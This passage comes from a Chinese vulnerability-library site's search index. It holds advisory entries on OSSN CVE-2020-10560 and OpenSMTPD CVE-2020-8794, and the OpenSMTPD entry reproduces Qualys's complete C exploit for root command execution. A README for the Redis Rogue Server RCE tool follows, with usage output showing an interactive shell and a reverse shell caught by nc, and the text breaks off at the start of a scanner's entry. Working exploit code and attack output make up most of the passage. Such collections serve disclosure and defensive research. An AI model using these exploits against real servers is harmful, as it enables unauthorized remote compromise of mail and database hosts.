<p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OSSN/OSSN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-10560%EF%BC%89/#_4","title":"\u9a8c\u8bc1\u6761\u4ef6","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OSSN/OSSN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-10560%EF%BC%89/#_5","title":"\u9a8c\u8bc1\u8fc7\u7a0b","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OSSN/OSSN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-10560%EF%BC%89/#_6","title":"\u3010\u9632\u5fa1\u65b9\u5f0f\u3011","text":"<ul> <li>\u76ee\u524d\u5382\u5546\u5df2\u53d1\u5e03\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u6f0f\u6d1e\uff0c\u8be6\u60c5\u8bf7\u5173\u6ce8\u5382\u5546\u4e3b\u9875\uff1a    https://www.opensource-socialnetwork.org/</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OSSN/OSSN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-10560%EF%BC%89/#_7","title":"\u3010\u53c2\u8003\u8d44\u6599\u3011","text":"<ul> <li>https://techanarchy.net/blog/cve-2020-10560-ossn-arbitrary-file-read</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OpenSMTP/CVE-2020-8794-OpenSMTPD%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"CVE 2020 8794 OpenSMTPD \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OpenSMTP/CVE-2020-8794-OpenSMTPD%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#cve-2020-8794-opensmtpd","title":"CVE-2020-8794: OpenSMTPD \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u901a\u544a","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OpenSMTP/CVE-2020-8794-OpenSMTPD%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#0x00","title":"0x00 \u6f0f\u6d1e\u80cc\u666f","text":"<p>2020\u5e7403\u670802\u65e5\uff0c 360CERT\u76d1\u6d4b\u53d1\u73b0\u56fd\u5916 <code>qualys</code> \u7814\u7a76\u56e2\u961f\u5df2\u7ecf\u516c\u5e03 <code>OpenSMTPD</code> \u7684\u4e00\u679a\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u7684\u6f0f\u6d1e\u7ec6\u8282\uff0c\u6f0f\u6d1e\u7f16\u53f7\u4e3a <code>CVE-2020-8794</code>\uff0c\u5f71\u54cd <code>6.6.4</code> \u53ca\u4e4b\u524d\u7684\u7248\u672c\u3002</p> <p>\u8be5\u6f0f\u6d1e\u662f\u4e00\u4e2a\u8d8a\u754c\u8bfb\u6f0f\u6d1e\uff0c\u5728 2015\u5e7412\u6708\u88ab\u5f15\u5165 (commit id <code>80c6a60c</code>)\u3002</p> <p>\u4e0e\u4e0a\u4e00\u4e2a\u6f0f\u6d1e <code>CVE-2020-7247</code> \u76f8\u6bd4\uff0c<code>CVE-2020-8794</code>\u4ea7\u751f\u4e86\u66f4\u4e3a\u5e7f\u6cdb\u7684\u5f71\u54cd\u7248\u672c\uff0c\u653b\u51fb\u65b9\u5f0f\u66f4\u4e3a\u590d\u6742\u3002</p> <p>\u8be5\u6f0f\u6d1e\u5728\u9ed8\u8ba4\u5b89\u88c5 <code>OpenSMTPD</code> \u60c5\u51b5\u4e0b\uff0c\u5373\u53ef\u653b\u51fb\u6210\u529f\u5e76\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OpenSMTP/CVE-2020-8794-OpenSMTPD%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#0x01","title":"0x01 \u98ce\u9669\u7b49\u7ea7","text":"<p>360CERT\u5bf9\u8be5\u6f0f\u6d1e\u8fdb\u884c\u8bc4\u5b9a</p> \u8bc4\u5b9a\u65b9\u5f0f \u7b49\u7ea7 \u5a01\u80c1\u7b49\u7ea7 \u9ad8\u5371 \u5f71\u54cd\u9762 \u4e00\u822c <p>360CERT\u5efa\u8bae\u5e7f\u5927\u7528\u6237\u53ca\u65f6\u66f4\u65b0<code>OpenSMTPD</code>\u3002\u505a\u597d\u8d44\u4ea7 \u81ea\u67e5/\u81ea\u68c0/\u9884\u9632 \u5de5\u4f5c\uff0c\u4ee5\u514d\u906d\u53d7\u653b\u51fb\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OpenSMTP/CVE-2020-8794-OpenSMTPD%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#0x02","title":"0x02 \u5f71\u54cd\u7248\u672c","text":"<p>OpenSMTPD &lt;= 6.6.4</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OpenSMTP/CVE-2020-8794-OpenSMTPD%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#0x03","title":"0x03 \u4fee\u590d\u5efa\u8bae","text":"<p>\u6700\u65b0\u7248\u672c\u4e3a <code>6.6.4p1</code>\u3002</p> <p>Debain \u7528\u6237\u53ef\u4ee5\u901a\u8fc7 <code>apt</code> \u5305\u7ba1\u7406\u5668\u5347\u7ea7 <code>OpenSMTPD</code></p> <p>stretch 6.0.2p1-2+deb9u3</p> <p>buster 6.0.3p1-5+deb10u4</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OpenSMTP/CVE-2020-8794-OpenSMTPD%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#0x4-exp","title":"0x4 \u6f0f\u6d1e\u5229\u7528EXP\uff1a","text":"<pre><code>/*\n * LPE and RCE in OpenSMTPD's default install (CVE-2020-8794)\n * Copyright (C) 2020 Qualys, Inc.\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see &lt;https://www.gnu.org/licenses/&gt;.\n */\n\n#include &lt;sys/types.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;netinet/in.h&gt;\n#include &lt;netinet/tcp.h&gt;\n#include &lt;netdb.h&gt;\n#include &lt;stdarg.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;time.h&gt;\n#include &lt;unistd.h&gt;\n\nstatic enum {\n    CLIENT_SIDE_EXPLOIT,\n    SERVER_SIDE_EXPLOIT,\n} exploit = CLIENT_SIDE_EXPLOIT;\n\nstatic enum {\n    NEW_SMTPD_GRAMMAR,\n    OLD_SMTPD_GRAMMAR,\n} grammar = NEW_SMTPD_GRAMMAR;\n\nstatic struct {\n    const char * command;\n    const char * user;\n    const char * dispatcher;\n    const char * maildir;\n    char lines[512];\n} inject = {\n    .command = \"X=`mktemp /tmp/x.XXXXXX`&amp;&amp;id&gt;&gt;$X;exit 0\",\n    .user = \"root\",\n    .dispatcher = \"local_mail\",\n    .maildir = NULL,\n};\n\n#define die() do { \\\n    printf(\"died in %s: %u\\n\", __func__, __LINE__); \\\n    exit(EXIT_FAILURE); \\\n} while (0)\n\nstatic struct addrinfo *\ncommon_getaddrinfo(const char * const host, const char * const port)\n{\n    const struct addrinfo hints = {\n        .ai_family = AF_INET,\n        .ai_socktype = SOCK_STREAM,\n        .ai_protocol = IPPROTO_TCP,\n        .ai_flags = AI_NUMERICHOST | AI_NUMERICSERV,\n    };\n    struct addrinfo * addr = NULL;\n    if (getaddrinfo(host, port, &amp;hints, &amp;addr) != 0) die();\n    if (addr == NULL || addr-&gt;ai_next != NULL) die();\n    return addr;\n}\n\nstatic const char *\ncommon_getnameinfo(const struct sockaddr * const addr, const socklen_t addr_len)\n{\n    static char host[NI_MAXHOST];\n    static char port[NI_MAXSERV];\n    if (getnameinfo(addr, addr_len, host, sizeof(host), port, sizeof(port),\n        NI_NUMERICHOST | NI_NUMERICSERV) != 0) die();\n\n    static char host_port[NI_MAXHOST + NI_MAXSERV];\n    if (snprintf(host_port, sizeof(host_port), \"%s:%s\", host, port) &lt;= 0) die();\n    return host_port;\n}\n\nstatic void\ncommon_send(const int fd, const char * const format, va_list ap)\n{\n    if (fd &lt;= -1) die();\n    static char buf[1024];\n    const int len = vsnprintf(buf, sizeof(buf), format, ap);\n    if (len &lt;= 0 || (unsigned)len &gt;= sizeof(buf)) die();\n    printf(\"--&gt; %s%s\", buf, buf[len-1] != '\\n' ? \"\\n\" : \"\");\n\n    const char * data = buf;\n    size_t size = len;\n\n    for (;;) {\n        const ssize_t sent = send(fd, data, size, MSG_NOSIGNAL);\n        if (sent &lt;= 0) die();\n        if ((size_t)sent &gt; size) die();\n        data += sent;\n        size -= sent;\n        if (size &lt;= 0) return;\n    }\n    die();\n}\n\nstatic int listen_fd = -1;\n\nstatic void\nserver_listen(void)\n{\n    if (listen_fd != -1) die();\n    const struct addrinfo * const addr = common_getaddrinfo(\"0.0.0.0\", \"25\");\n    listen_fd = socket(addr-&gt;ai_family, addr-&gt;ai_socktype, addr-&gt;ai_protocol);\n    if (listen_fd &lt;= -1) die();\n\n    const int on = 1;\n    if (setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &amp;on, sizeof(on)) != 0) die();\n    if (bind(listen_fd, addr-&gt;ai_addr, addr-&gt;ai_addrlen) != 0) die();\n    if (listen(listen_fd, 10) != 0) die();\n\n    printf(\"\\nListening on %s\\n\",\n        common_getnameinfo(addr-&gt;ai_addr, addr-&gt;ai_addrlen));\n}\n\nstatic int server_fd = -1;\n\nstatic void\nserver_accept(void)\n{\n    struct sockaddr addr;\n    socklen_t addr_len = sizeof(addr);\n\n    if (listen_fd &lt;= -1) die();\n    if (server_fd != -1) die();\n    server_fd = accept(listen_fd, &amp;addr, &amp;addr_len);\n    if (server_fd &lt;= -1) die();\n    if (addr_len &gt; sizeof(addr)) die();\n\n    const time_t now = time(NULL);\n    printf(\"\\nConnection from %s\\n%s\",\n        common_getnameinfo(&amp;addr, addr_len), ctime(&amp;now));\n\n    const int on = 1;\n    if (setsockopt(server_fd, IPPROTO_TCP, TCP_NODELAY, &amp;on, sizeof(on)) != 0) die();\n}\n\nstatic void\nserver_send(const char * const format, ...)\n{\n    if (server_fd &lt;= -1) die();\n\n    va_list ap;\n    va_start(ap, format);\n    common_send(server_fd, format, ap);\n    va_end(ap);\n}\n\nstatic char server_command[1024];\n\nstatic void\nserver_recv(const char * const prefix)\n{\n    if (server_fd &lt;= -1) die();\n    const size_t prefix_len = strlen(prefix);\n    if (prefix_len &lt; 4) die();\n\n    char * data = server_command;\n    size_t size = sizeof(server_command);\n\n    for (;;) {\n        const ssize_t rcvd = recv(server_fd, data, size, 0);\n        if (rcvd &lt;= 0) die();\n        if ((size_t)rcvd &gt;= size) die();\n        data += rcvd;\n        size -= rcvd;\n        data[0] = '\\0';\n        if (data[-1] != '\\n') continue;\n        if (strchr(server_command, '\\n') != data - 1) die();\n\n        printf(\"&lt;-- %s\", server_command);\n        if (strncmp(server_command, prefix, prefix_len) != 0) die();\n        return;\n    }\n    die();\n}\n\nstatic void\nserver_close(void)\n{\n    if (server_fd &lt;= -1) die();\n    if (close(server_fd) != 0) die();\n    server_fd = -1;\n}\n\nstatic void\nserver_session(const char * const inject_lines)\n{\n    const char * const error_code =\n        (exploit == SERVER_SIDE_EXPLOIT) ? \"421\" : \"553\";\n\n    server_accept();\n    server_send(\"220 ent.of.line ESMTP\\n\");\n\n    server_recv(\"EHLO \");\n    server_send(\"250 ent.of.line Hello\\n\");\n\n    server_recv(\"MAIL FROM:&lt;\");\n    if ((strncmp(server_command, \"MAIL FROM:&lt;&gt;\", 12) == 0) !=\n        (exploit == SERVER_SIDE_EXPLOIT)) die();\n\n    if (inject_lines != NULL) {\n        if (inject_lines[0] == '\\0') die();\n        if (inject_lines[0] == '\\n') die();\n        if (inject_lines[strlen(inject_lines)-1] == '\\n') die();\n\n        server_send(\"%s-Error\\n\", error_code);\n        server_send(\"%s\\n\\n%s%c\", error_code, inject_lines, (int)'\\0');\n\n    } else {\n        server_send(\"%s Error\\n\", error_code);\n\n        server_recv(\"RSET\");\n        server_send(\"250 Reset\\n\");\n\n        server_recv(\"QUIT\");\n        server_send(\"221 Bye\\n\");\n    }\n    server_close();\n}\n\nstatic const struct addrinfo * client_target = NULL;\nstatic const char * client_mail = NULL;\nstatic const char * client_rcpt = NULL;\n\nstatic int client_fd = -1;\n\nstatic void\nclient_connect(void)\n{\n    if (client_fd != -1) die();\n    client_fd = socket(client_target-&gt;ai_family, client_target-&gt;ai_socktype,\n        client_target-&gt;ai_protocol);\n    if (client_fd &lt;= -1) die();\n\n    if (connect(client_fd, client_target-&gt;ai_addr,\n        client_target-&gt;ai_addrlen) != 0) die();\n\n    printf(\"\\nConnected to %s\\n\",\n        common_getnameinfo(client_target-&gt;ai_addr, client_target-&gt;ai_addrlen));\n}\n\nstatic void\nclient_send(const char * const format, ...)\n{\n    if (client_fd &lt;= -1) die();\n\n    va_list ap;\n    va_start(ap, format);\n    common_send(client_fd, format, ap);\n    va_end(ap);\n}\n\nstatic char client_reply[1024];\n\nstatic void\nclient_recv(const char * const prefix)\n{\n    if (client_fd &lt;= -1) die();\n    const size_t prefix_len = strlen(prefix);\n    if (prefix_len &lt; 3) die();\n\n    char * data = client_reply;\n    size_t size = sizeof(client_reply);\n    const char * line = data;\n\n    for (;;) {\n        const ssize_t rcvd = recv(client_fd, data, size, 0);\n        if (rcvd &lt;= 0) die();\n        if ((size_t)rcvd &gt;= size) die();\n        data += rcvd;\n        size -= rcvd;\n        data[0] = '\\0';\n        if (data[-1] != '\\n') continue;\n\n        for (;;) {\n            const char * const new_line = strchr(line, '\\n');\n            if (new_line == NULL) break;\n            if (new_line - line &lt; 4) die();\n            printf(\"&lt;-- %.*s\", (int)(new_line - line + 1), line);\n            if (strncmp(line, prefix, prefix_len) != 0) die();\n\n            if (line[3] == ' ') {\n                if (new_line + 1 != data) die();\n                return;\n            }\n            if (line[3] != '-') die();\n            line = new_line + 1;\n        }\n        if (line != data) die();\n    }\n    die();\n}\n\nstatic void\nclient_close(void)\n{\n    if (client_fd &lt;= -1) die();\n    if (close(client_fd) != 0) die();\n    client_fd = -1;\n}\n\nstatic void\nclient_session(void)\n{\n    client_connect();\n    client_recv(\"220 \");\n\n    client_send(\"HELP\\n\");\n    client_recv(\"214\");\n    if (strstr(client_reply, \"please contact bugs@openbsd.org\") == NULL) die();\n\n    client_send(\"EHLO ent.of.line\\n\");\n    client_recv(\"250\");\n    const int dsn = (strstr(client_reply, \"250-DSN\") != NULL);\n\n    client_send(\"MAIL FROM:&lt;%s&gt;\\n\", client_mail);\n    client_recv(\"250 \");\n\n    client_send(\"RCPT TO:&lt;%s&gt;%s\\n\", client_rcpt, dsn ? \" NOTIFY=SUCCESS\" : \"\");\n    client_recv(\"250 \");\n\n    client_send(\"DATA\\n\");\n    client_recv(\"354 Enter mail, end with \");\n\n    if (!dsn) {\n        client_send(\"Delivered-To: %s\\n\", client_rcpt);\n    }\n    client_send(\"\\n\");\n    client_send(\".\\n\");\n    client_recv(\"250 \");\n\n    client_send(\"QUIT\\n\");\n    client_recv(\"221 \");\n    client_close();\n}\n\nint\nmain(int argc, char * const * argv)\n{\n    setlinebuf(stdout);\n    puts(\"LPE and RCE in OpenSMTPD's default install (CVE-2020-8794)\");\n    puts(\"Copyright (C) 2020 Qualys, Inc.\");\n\n    int opt;\n    while ((opt = getopt(argc, argv, \"c:u:d:m:n\")) != -1) {\n        switch (opt) {\n        case 'c':\n            inject.command = optarg;\n            break;\n        case 'u':\n            grammar = OLD_SMTPD_GRAMMAR;\n            inject.user = optarg;\n            break;\n        case 'd':\n            inject.dispatcher = optarg;\n            break;\n        case 'm':\n            grammar = OLD_SMTPD_GRAMMAR;\n            inject.maildir = optarg;\n            break;\n        case 'n':\n            grammar = NEW_SMTPD_GRAMMAR;\n            break;\n        default:\n            die();\n        }\n    }\n\n    if (grammar == NEW_SMTPD_GRAMMAR) {\n        const int len = snprintf(inject.lines, sizeof(inject.lines),\n            \"type:mda\\nmda-exec:%s\\ndispatcher:%s\\nmda-user:%s\",\n            inject.command, inject.dispatcher, inject.user);\n        if (len &lt;= 0 || (unsigned)len &gt;= sizeof(inject.lines)) die();\n\n    } else if (grammar == OLD_SMTPD_GRAMMAR) {\n        const int len = snprintf(inject.lines, sizeof(inject.lines),\n            \"type:mda\\nmda-buffer:%s\\nmda-method:%s\\nmda-user:%s\\nmda-usertable:&lt;getpwnam&gt;\",\n            inject.maildir ? inject.maildir : inject.command,\n            inject.maildir ? \"maildir\" : \"mda\", inject.user);\n        if (len &lt;= 0 || (unsigned)len &gt;= sizeof(inject.lines)) die();\n\n    } else die();\n\n    argc -= optind;\n    argv += optind;\n\n    if (argc == 3) {\n        exploit = SERVER_SIDE_EXPLOIT;\n        client_target = common_getaddrinfo(argv[0], \"25\");\n        client_mail = argv[1];\n        client_rcpt = argv[2];\n\n    } else if (argc != 0) die();\n\n    server_listen();\n    if (exploit == CLIENT_SIDE_EXPLOIT) {\n        server_session(inject.lines);\n\n    } else if (exploit == SERVER_SIDE_EXPLOIT) {\n        client_session();\n        unsigned try;\n        for (try = 0; try &lt; 1; try++) {\n            server_session(NULL);\n            puts(\"\\nPlease wait for OpenSMTPD to connect back...\");\n        }\n        server_session(inject.lines);\n        client_session();\n        server_session(\"type:invalid\");\n\n    } else die();\n    exit(EXIT_SUCCESS);\n}\n</code></pre> <p>\u6ce8\uff1aEXP\u6765\u6e90\u4e8e\uff1ahttps://www.exploit-db.com/exploits/48140</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OpenSMTP/CVE-2020-8794-OpenSMTPD%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#0x05","title":"0x05 \u53c2\u8003\u94fe\u63a5","text":"<p>1\u3001qualys \u62a5\u544a</p> <p>[https://www.qualys.com/2020/02/24/cve-2020-8794/lpe-rce-opensmtpd-default-install.txt]</p> <p>2\u3001qualys \u62a5\u544a\u7ec6\u8282</p> <p>[https://www.qualys.com/2020/02/24/cve-2020-8794/lpe-rce-opensmtpd-default-install-exploit.c]</p> <p>3\u3001CVE-2020-7247: OpenSMTPD \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u901a\u544a - 360CERT</p> <p>[https://cert.360.cn/warning/detail?id=b03e92c903678dd6497d1be040f761d5]</p> <p>4\u3001Releases \u00b7 OpenSMTPD/OpenSMTPD</p> <p>[https://github.com/OpenSMTPD/OpenSMTPD/releases]</p> <p>5\u3001Debian -- Security Information -- DSA-4634-1 opensmtpd</p> <p>[https://www.debian.org/security/2020/dsa-4634]</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Redis/Redis%204.x5.x%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"Redis Rogue Server","text":"<p>A exploit for Redis(&lt;=5.0.5) RCE, inspired by Redis post-exploitation.</p> <p>Support interactive shell and reverse shell!</p> <p>github\u83b7\u53d6\u6587\u4ef6</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Redis/Redis%204.x5.x%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#requirements","title":"Requirements","text":"<p>Python 3.6+</p> <p>If you want to modify or recompile the redis module, you also require <code>make</code>.</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Redis/Redis%204.x5.x%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#usage","title":"Usage","text":"<p>Compile exploit:</p> <pre><code>cd RedisModulesSDK/exp/\nmake\n</code></pre> <p>Copy the .so file to same folder with <code>redis-rogue-server.py</code>.</p> <pre><code>\u279c ./redis-rogue-server.py -h\n______         _ _      ______                         _____                          \n| ___ \\       | (_)     | ___ \\                       /  ___|                         \n| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \\ `--.  ___ _ ____   _____ _ __ \n|    // _ \\/ _` | / __| |    // _ \\ / _` | | | |/ _ \\  `--. \\/ _ \\ '__\\ \\ / / _ \\ '__|\n| |\\ \\  __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| |  __/ /\\__/ /  __/ |   \\ V /  __/ |   \n\\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_|    \\_/ \\___|_|   \n                                     __/ |                                            \n                                    |___/                                             \n@copyright n0b0dy @ r3kapig\n\nUsage: redis-rogue-server.py [options]\n\nOptions:\n  -h, --help           show this help message and exit\n  --rhost=REMOTE_HOST  target host\n  --rport=REMOTE_PORT  target redis port, default 6379\n  --lhost=LOCAL_HOST   rogue server ip\n  --lport=LOCAL_PORT   rogue server listen port, default 21000\n  --exp=EXP_FILE       Redis Module to load, default exp.so\n  -v, --verbose        Show full data stream\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Redis/Redis%204.x5.x%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#example","title":"Example","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Redis/Redis%204.x5.x%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#interactive-shell","title":"Interactive shell","text":"<pre><code>\u279c ./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1\n______         _ _      ______                         _____                          \n| ___ \\       | (_)     | ___ \\                       /  ___|                         \n| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \\ `--.  ___ _ ____   _____ _ __ \n|    // _ \\/ _` | / __| |    // _ \\ / _` | | | |/ _ \\  `--. \\/ _ \\ '__\\ \\ / / _ \\ '__|\n| |\\ \\  __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| |  __/ /\\__/ /  __/ |   \\ V /  __/ |   \n\\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_|    \\_/ \\___|_|   \n                                     __/ |                                            \n                                    |___/                                             \n@copyright n0b0dy @ r3kapig\n\n[info] TARGET 127.0.0.1:6379\n[info] SERVER 127.0.0.1:21000\n[info] Setting master...\n[info] Setting dbfilename...\n[info] Loading module...\n[info] Temerory cleaning up...\nWhat do u want, [i]nteractive shell or [r]everse shell: i\n[info] Interact mode start, enter \"exit\" to quit.\n[&lt;&lt;] whoami\n[&gt;&gt;] :n0b0dy\n[&lt;&lt;] \n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Redis/Redis%204.x5.x%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#reverse-shell","title":"Reverse shell","text":"<p>Invoke reverse shell:</p> <pre><code>\u279c ./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1\n______         _ _      ______                         _____\n| ___ \\       | (_)     | ___ \\                       /  ___|\n| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \\ `--.  ___ _ ____   _____ _ __\n|    // _ \\/ _` | / __| |    // _ \\ / _` | | | |/ _ \\  `--. \\/ _ \\ '__\\ \\ / / _ \\ '__|\n| |\\ \\  __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| |  __/ /\\__/ /  __/ |   \\ V /  __/ |\n\\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_|    \\_/ \\___|_|\n                                     __/ |\n                                    |___/\n@copyright n0b0dy @ r3kapig\n\n[info] TARGET 127.0.0.1:6379\n[info] SERVER 127.0.0.1:21000\n[info] Setting master...\n[info] Setting dbfilename...\n[info] Loading module...\n[info] Temerory cleaning up...\nWhat do u want, [i]nteractive shell or [r]everse shell: r\n[info] Open reverse shell...\nReverse server address: 127.0.0.1\nReverse server port: 9999\n[info] Reverse shell payload sent.\n[info] Check at 127.0.0.1:9999\n[info] Unload module...\n</code></pre> <p>Receive reverse shell:</p> <pre><code>\u279c nc -lvvp 9999\nListening on [0.0.0.0] (family 0, port 9999)\nConnection from localhost.localdomain 39312 received!\nwhoami\nn0b0dy\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Redis/Redis%204.x5.x%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#thanks","title":"Thanks","text":"<ul> <li>RicterZ's redis exec module: https://github.com/RicterZ/RedisModules-ExecuteCommand</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Redis/redis%E3%80%81mongodb%E3%80%81memcached%E3%80%81elasticsearch%E3%80%81zookeeper%E3%80%81ftp%E3%80%81CouchDB%E3%80%81docker%E3%80%81Hadoop%E6%9C%AA%E6%8E%88%E6%9D%83/","title":"unauthorized-check","text":"<p>\u626b\u63cf\u4ee5\u4e0b\u5e38\u89c1\u672a\u6388\u6743\u8bbf\u95ee</p> <pre><code>redis\u3001mongodb\u3001memcached\u3001elasticsearch\u3001zookeeper\u3001ftp\u3001CouchDB\u3001docker\u3001Hadoop\n</code></pre> <p>\u5b89\u88c5</p> <pre><code>pip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/\n</code></pre> <p>\u4f7f\u7528\u8bf4\u660e</p> <pre><code>python3 unauthorized-check.py 